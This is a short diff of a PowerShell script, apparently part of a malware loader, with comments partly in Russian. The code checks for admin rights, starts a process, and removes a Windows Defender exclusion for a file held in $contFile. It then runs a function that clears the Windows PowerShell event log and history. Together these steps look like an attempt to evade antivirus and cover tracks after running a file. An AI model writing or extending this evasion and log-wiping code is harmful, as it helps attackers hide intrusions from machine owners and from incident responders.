@@ -26,9 +26,10 @@ function Ensure-RunAsAdmin {
 Ensure-RunAsAdmin
 
 function ClrHistory {
+
     try {
         Write-Host "Clearing logs and history..." -ForegroundColor Green
-        Remove-MpPreference -ExclusionPath $contFile -ErrorAction Ignore
+        
         # Очистка журнала PowerShell
         if (Get-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue) {
             Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
@@ -102,6 +103,9 @@ try {
         Write-Host "Error Start-Process, please restart for Administrator" -ForegroundColor Red
 		Start-Sleep -s 3
     }
+	try{
+		Remove-MpPreference -ExclusionPath $contFile -ErrorAction Ignore
+	} catch{ Write-Host "Remove-MpPreference: $($_.Exception.Message)" -ForegroundColor Red }
 } finally {
 	
     ClrHistory
